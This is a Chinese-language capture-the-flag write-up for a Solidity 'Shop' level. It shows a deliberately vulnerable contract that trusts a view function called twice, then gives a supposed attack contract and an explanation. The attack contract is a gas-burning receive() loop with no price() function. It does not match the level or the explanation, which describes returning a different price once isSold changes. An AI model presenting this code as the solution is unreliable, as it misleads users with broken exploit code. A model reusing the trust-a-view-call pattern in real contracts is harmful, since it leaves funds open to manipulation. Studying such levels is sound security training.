# 21 - Shop

## 题目
攻击以下合约
```solidity
//
//Сan you get the item from the shop for less than the price asked?
//
//Things that might help:
//Shop expects to be used from a Buyer
//Understanding restrictions of view functions
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
function price() external view returns (uint256);
}

contract Shop {
uint256 public price = 100;
bool public isSold;

function buy() public {
Buyer _buyer = Buyer(msg.sender);

if (_buyer.price() >= price && !isSold) {
isSold = true;
price = _buyer.price();
}
}
}
```

## 解题

部署攻击合约如下：
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GasBurner {
    uint256 n;

    function burn() internal {
        while (gasleft() > 0) {
            n += 1;
        }
    }

    receive() external payable {
        burn();
    }
}
```
这个合约的问题在于
当 if (_buyer.price() >= price && !isSold) { 时，调用了攻击合约的price 函数，得到的数字必须比shop定义的价格高
isSold = true; 但是在第二次调用时，先改变了 isSold 的状态
price = _buyer.price(); 第二次调用攻击合约的price函数，这是可以根据isSold的状态来给出不同与之前的低价，这样就能够改变 shop 的价格。


